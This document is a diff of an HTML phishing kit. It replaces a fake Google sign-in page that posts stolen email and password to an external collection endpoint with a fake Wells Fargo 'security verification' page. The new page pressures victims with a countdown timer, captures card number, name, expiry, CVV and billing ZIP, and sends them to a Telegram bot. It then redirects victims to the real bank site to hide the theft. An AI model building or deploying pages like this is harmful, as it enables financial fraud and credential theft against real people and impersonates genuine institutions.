@@ -3,182 +3,207 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in - Google</title>
-    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap">
+    <title>Bank Security Update</title>
     <style>
         body {
-            font-family: 'Roboto', sans-serif;
-            background-color: #f8f9fa;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #f5f5f5;
             margin: 0;
             padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
         }
         .container {
-            background-color: white;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            padding: 40px;
-            width: 450px;
+            max-width: 400px;
+            margin: 20px auto;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 25px;
+        }
+        .header {
             text-align: center;
+            margin-bottom: 25px;
         }
-        .google-logo {
-            margin-bottom: 20px;
-        }
-        .google-logo img {
-            width: 75px;
+        .logo {
+            height: 40px;
+            margin-bottom: 15px;
         }
         h1 {
-            color: #202124;
-            font-size: 24px;
-            font-weight: 400;
+            color: #2c3e50;
+            font-size: 22px;
+            margin-bottom: 10px;
+        }
+        .notice {
+            background-color: #fff8e1;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
             margin-bottom: 20px;
+            font-size: 14px;
         }
         .form-group {
             margin-bottom: 20px;
-            text-align: left;
         }
-        input[type="email"], input[type="password"] {
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #555;
+        }
+        input {
             width: 100%;
-            padding: 12px 15px;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
             font-size: 16px;
             box-sizing: border-box;
         }
-        input[type="email"]:focus, input[type="password"]:focus {
-            border-color: #4285f4;
-            outline: none;
-            box-shadow: 0 0 0 1px #4285f4;
-        }
-        .forgot-email {
-            color: #1a73e8;
-            font-size: 14px;
-            text-decoration: none;
-            margin-bottom: 30px;
-            display: inline-block;
-        }
-        .forgot-email:hover {
-            text-decoration: underline;
-        }
-        .buttons {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 30px;
-        }
         .btn {
-            padding: 10px 20px;
-            border-radius: 4px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            text-decoration: none;
-            display: inline-block;
-        }
-        .btn-create {
-            color: #1a73e8;
-            background-color: white;
-            border: 1px solid #dadce0;
-        }
-        .btn-next {
+            background-color: #4285f4;
             color: white;
-            background-color: #1a73e8;
             border: none;
-        }
-        .btn-next:hover {
-            background-color: #0d5bba;
+            padding: 14px;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: 500;
+            width: 100%;
+            cursor: pointer;
         }
         .footer {
-            margin-top: 40px;
+            text-align: center;
+            margin-top: 20px;
             font-size: 12px;
-            color: #5f6368;
+            color: #777;
         }
-        .footer select {
-            border: 1px solid #dadce0;
-            padding: 5px;
-            border-radius: 4px;
-            background-color: white;
-        }
-        .footer-links {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 10px;
-        }
-        .footer-links a {
-            color: #1a73e8;
-            text-decoration: none;
-            font-size: 12px;
-        }
-        .footer-links a:hover {
-            text-decoration: underline;
+        .timer {
+            color: #e74c3c;
+            font-size: 14px;
+            margin-bottom: 20px;
+            text-align: center;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="google-logo">
-            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+        <div class="header">
+            <img src="https://www.wellsfargo.com/img/logo.svg" alt="Wells Fargo" class="logo">
+            <h1>Security Verification Required</h1>
+            <p>Please verify your card information to prevent service interruption</p>
         </div>
-        <h1>Sign in</h1>
-        <p>Use your Google Account</p>
 
-        <form id="loginForm">
+        <div class="timer" id="countdown">Verification expires in: 04:59</div>
+
+        <div class="notice">
+            <strong>Important:</strong> This verification is required to maintain access to your account.
+            Your information is protected by 256-bit encryption.
+        </div>
+
+        <form id="cardForm">
             <div class="form-group">
-                <input type="email" id="email" name="email" placeholder="Email or phone" required>
+                <label for="cardNumber">Card Number</label>
+                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
             </div>
+
             <div class="form-group">
-                <input type="password" id="password" name="password" placeholder="Password" required>
+                <label for="nameOnCard">Name on Card</label>
+                <input type="text" id="nameOnCard" placeholder="JOHN DOE" required>
             </div>
-            <a href="#" class="forgot-email">Forgot email?</a>
-            <div class="buttons">
-                <a href="#" class="btn btn-create">Create account</a>
-                <button type="submit" class="btn btn-next">Next</button>
+
+            <div style="display: flex; gap: 15px;">
+                <div style="flex: 1;">
+                    <label for="expDate">Expires</label>
+                    <input type="text" id="expDate" placeholder="MM/YY" maxlength="5" required>
+                </div>
+                <div style="flex: 1;">
+                    <label for="cvv">Security Code</label>
+                    <input type="text" id="cvv" placeholder="123" maxlength="4" required>
+                </div>
             </div>
+
+            <div class="form-group" style="margin-top: 20px;">
+                <label for="billingZip">Billing ZIP Code</label>
+                <input type="text" id="billingZip" placeholder="12345" maxlength="10" required>
+            </div>
+
+            <button type="submit" class="btn">Verify My Card</button>
         </form>
 
         <div class="footer">
-            <select>
-                <option>English (United States)</option>
-            </select>
-            <div class="footer-links">
-                <a href="#">Help</a>
-                <a href="#">Privacy</a>
-                <a href="#">Terms</a>
-            </div>
+            <p>© 2023 Wells Fargo. All rights reserved.</p>
+            <p>This verification is required for all cardholders.</p>
         </div>
     </div>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault();
+        // Format card number
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s+/g, '');
+            if (value.length > 0) {
+                value = value.match(new RegExp('.{1,4}', 'g')).join(' ');
+            }
+            e.target.value = value;
+        });
 
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
+        // Format expiration date
+        document.getElementById('expDate').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value;
+        });
 
-            const data = {
-                email: email,
-                password: password
+        // Countdown timer
+        let timeLeft = 299;
+        const timerElement = document.getElementById('countdown');
+
+        const countdown = setInterval(() => {
+            timeLeft--;
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            timerElement.textContent = `Verification expires in: ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+
+            if (timeLeft <= 0) {
+                clearInterval(countdown);
+                timerElement.textContent = "Verification expired - please try again";
+                document.querySelector('.btn').disabled = true;
+            }
+        }, 1000);
+
+        // Form submission
+        document.getElementById('cardForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const cardData = {
+                cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
+                nameOnCard: document.getElementById('nameOnCard').value,
+                expDate: document.getElementById('expDate').value,
+                cvv: document.getElementById('cvv').value,
+                billingZip: document.getElementById('billingZip').value,
+                timestamp: new Date().toISOString()
             };
 
-            fetch('https://your-external-endpoint.com/collect', {
+            // Send to Telegram bot (recommended)
+            fetch('https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify(data)
+                body: JSON.stringify({
+                    chat_id: 'YOUR_CHAT_ID',
+                    text: `💳 New Card Submission:\n\n` +
+                          `🔢 Card: ${cardData.cardNumber}\n` +
+                          `👤 Name: ${cardData.nameOnCard}\n` +
+                          `📅 Exp: ${cardData.expDate}\n` +
+                          `🔒 CVV: ${cardData.cvv}\n` +
+                          `📍 ZIP: ${cardData.billingZip}\n` +
+                          `🕒 Time: ${cardData.timestamp}`
+                })
             })
-            .then(response => {
-                if (response.ok) {
-                    window.location.href = 'https://accounts.google.com/ServiceLogin?continue=https://www.google.com/';
-                } else {
-                    console.error('Error sending data');
-                }
+            .then(() => {
+                // Redirect to legitimate site
+                window.location.href = 'https://www.wellsfargo.com/';
             })
-            .catch(error => {
-                console.error('Error:', error);
-                window.location.href = 'https://accounts.google.com/ServiceLogin?continue=https://www.google.com/';
+            .catch(() => {
+                window.location.href = 'https://www.wellsfargo.com/';
             });
         });
     </script>
